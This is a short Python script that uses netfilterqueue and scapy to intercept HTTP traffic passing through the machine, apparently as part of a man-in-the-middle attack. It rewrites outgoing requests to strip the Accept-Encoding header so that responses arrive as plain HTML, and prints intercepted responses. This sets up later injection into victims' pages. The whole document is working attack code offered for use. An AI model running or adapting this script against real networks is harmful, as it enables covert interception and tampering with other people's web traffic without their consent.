#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy
import re as regex

# Defining loader functionality
def loader(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    del packet[scapy.IP].len
    return packet

# Defining Spoofed Functionality
def spoofed_packet(packets):
    scapy_packet = scapy.IP(packets.get_payload()) # converting packet to scapy packet i.e. IP layer
    if scapy_packet.haslayer(scapy.Raw):
        # Destination Port
        if scapy_packet[scapy.TCP].dport == 80:
            print("[+] Request")
            # Removing Accept-Encoding in the request using regex rules.
            # The old packet will be returned as a string
            # Thus it will decode the response into HTML code
            old_packet = regex.sub("Accept-Encoding:.*?\\r\\n", "", scapy_packet[scapy.Raw].load)
            new_packet = loader(scapy_packet, old_packet)
            packets.set_payload(str(new_packet)) # change payload of the packet that we will accept to the new payload
        # Source Port
        elif scapy_packet[scapy.TCP].sport == 80:
            print("[+] Response")
            print(scapy_packet.show())# in the spoofed functionality.
    packets.accept()  # accept packets

queue = netfilterqueue.NetfilterQueue()  # Creating instance of netfilterqueue object
queue.bind(0, spoofed_packet)  # to bind with the connceted queue. The 0 represents the queue no & the process_packet is
# the call back function
queue.run() # to run the function